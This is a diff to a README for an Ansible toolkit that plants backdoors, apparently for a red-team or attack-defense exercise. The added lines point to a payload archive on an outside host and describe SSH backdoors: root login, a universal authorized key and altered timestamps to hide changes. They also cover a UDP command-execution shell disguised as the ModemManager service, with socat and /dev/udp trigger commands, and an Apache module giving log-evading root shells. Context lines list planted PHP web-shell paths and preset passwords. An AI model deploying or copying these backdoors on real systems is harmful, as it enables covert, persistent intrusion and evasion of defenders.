@@ -4,6 +4,11 @@ The plays are defined in ansible/playbooks. Then they are referenced in configur
 To run:
 ansible-playbook -i inventory.yml confgiure.yml
 
+Some backdoors require clients or private keys.
+Download those from http://xync.org/en/payloads.tgz
+  Ansible scripts require this file to be unpacked in /opt directory
+  If you're not executing ansible, they keys and clients can be used from anywhere
+
 ### It will create users:
 zonifer:unique_password_zonifer
 svc:unique_password_svc
@@ -31,6 +36,21 @@ donttouch:unique_password_donttouch
 /var/www/html/prestashop/classes/Backups.php?backup=id
 /var/www/html/prestashop/classes/tax/taxes3.php?tax=id
 
+### SSH Modifications
+Configures ssh to allow password authentication (starts enabled)
+Configures ssh to allow logins by root
+Adds a universal authorized key called ivbackdoor (allows authentication as any user)
+Adds an authorized key to root (rootkey)
+Adds an authorized key to sysadmin (or grporter (same key) on Fed21)
+Updates modified times on all files to blend in
+
+### Install watershell as a systemd service named ModemManager (runs any command in the payload of a UDP packet to 1337)
+echo "run:touch /tmp/win" | socat - udp-datagram:172.25.40.255:1337
+OR from a bash shell (not zsh,csh,*sh)
+echo "run:touch /tmp/win" > /dev/udp/172.25.40.20/1337
+
+### Install the mod_rootme Apache mod (root shell from a web request, doesn't hit access_logs)
+/opt/payloads/common/apache-client [IP]
 
 # Windows
 This folder is full of windows bits
